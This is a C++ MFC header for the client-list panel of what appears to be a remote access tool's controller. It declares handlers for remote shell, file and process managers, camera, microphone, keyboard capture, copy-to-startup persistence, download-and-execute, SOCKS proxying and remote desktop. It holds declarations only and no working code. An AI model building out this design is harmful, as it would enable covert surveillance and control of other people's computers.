#pragma once
#include "afxcmn.h"
#include "KernelSrv.h"


class CClientGroup :
	public CMFCListCtrl
{
private:
	int m_sortCol;
	int m_ascending;
	int m_LastSortColum;

	TCHAR m_GroupName[0x40];
public:
	CClientGroup(CONST TCHAR * GroupName);
	~CClientGroup();

	CONST TCHAR * GetGroupName(){ return m_GroupName; }
	int GetGroupClientCount() { return GetItemCount(); }

		
	//afx_msg LRESULT OnKernelGetModulePath(WPARAM wParam, LPARAM lParam);
	//afx_msg LRESULT OnGetModulePath(WPARAM wParam, LPARAM lParam);

	void OnClientLogin(CKernelSrv * kernel);
	void OnClientLogout(CKernelSrv * kernel);
	void OnUpdateComment(CKernelSrv *kernel, TCHAR * szNewComment);
	void OnUpdateUploadStatus(CKernelSrv * kernel,LPVOID * ArgList);
	


	DECLARE_MESSAGE_MAP()
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);


	//afx_msg void OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult);
	
	afx_msg void OnPowerReboot();
	afx_msg void OnPowerShutdown();
	afx_msg void OnSessionDisconnect();
	afx_msg void OnOperationEditcomment();

	afx_msg void OnOperationCmd();
	afx_msg void OnOperationChatbox();
	afx_msg void OnOperationFilemanager();
	afx_msg void OnOperationCamera();
	afx_msg void OnSessionRestart();
	afx_msg void OnOperationMicrophone();


	afx_msg void OnOperationKeyboard();
	afx_msg void OnUtilsAddto();
	afx_msg void OnUtilsCopytostartup();
	afx_msg void OnUtilsDownloadandexec();
	afx_msg void OnProxySocksproxy();
	afx_msg void OnSessionExit();
	afx_msg void OnUtilsOpenwebpage();
	afx_msg void OnOperationProcessmanager();
	afx_msg void OnLvnColumnclick(NMHDR *pNMHDR, LRESULT *pResult);


	static int CALLBACK CompareByString(LPARAM, LPARAM, LPARAM);

	afx_msg void OnRemotedesktopDxgi();
	afx_msg void OnRemotedesktopGdi();
	afx_msg void OnContextMenu(CWnd* /*pWnd*/, CPoint /*point*/);
	afx_msg void OnOperationModifygroup();

};

